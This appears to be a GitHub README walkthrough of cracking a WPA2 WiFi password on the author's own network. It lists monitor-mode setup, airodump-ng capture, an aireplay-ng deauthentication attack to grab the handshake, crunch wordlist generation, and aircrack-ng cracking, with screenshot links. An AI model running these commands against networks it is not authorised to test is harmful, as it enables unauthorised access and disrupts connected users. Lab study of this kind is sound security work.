# Run "ifconfig" to check if wireless adapter is properly connected to machine & to check adapter name. 
[+] In my case it's (wlan0).
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-12-38.png">

# Followed by "iwconfig" to check what mode your wireless adapeter is in
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-16-01.png">

# "ifconfig wlan0 down", "sudo network check kill" - to drop wlan0 conection and kill all network process connected to machine respectively.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-17-23.png">

# "iwconfig wlan0 mode monitor", "ifconfig wlan0 up" - turn on monitor mode on wireless adapter and bring up wlan0 connection.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-18-09.png">

# Check wlan0 status, should be in monitor mode now.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-18-20.png">

# "airodump-ng wlan0" - to monitor packets and wireless services around you.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-18-59.png">

# Displays both network and connected devices(STATION section), quit the process by hitting the "CTRL + C" on your keyboard.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2011-19-17.png ">

# "airodump-ng --bssid (enter bssid) --channel (enter CH) wlan0" - to monitor packets on a specific network.
[+] chose the network with the name H4CKER which is my personal network.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2012-19-13.png">

# "airodump-ng --bssid (enter bssid) --channel(enter CH) --write (name file) wlan0" - capture packets in a file 
[+] Run a deauthentication attack with"aireplay-ng --deauth 10 -a (target BSSID) -c (target MAC) wlan0 " on another pane to capture network handshake.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-54-18.png">

# Waiting to capture handshake while device conects back to WPA2 network.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-54-31.png ">

# Handshake should be captured once deauth attack is complete.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-54-39.png">

# Generate wordlist with crunch - "crunch 6 12 abc -o word.txt"
[+] generated a wordlist of a minimum of 6 and maximum of 12 characters.
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-06-26.png">

# Run "aircrack-ng (captured_handshake_name) -w word.txt"
<img src="https://github.com/DghostNinja/Wifi_hacking/blob/main/Documentation/Camera%20Roll/Screenshot%20from%202023-08-17%2013-56-32.png ">
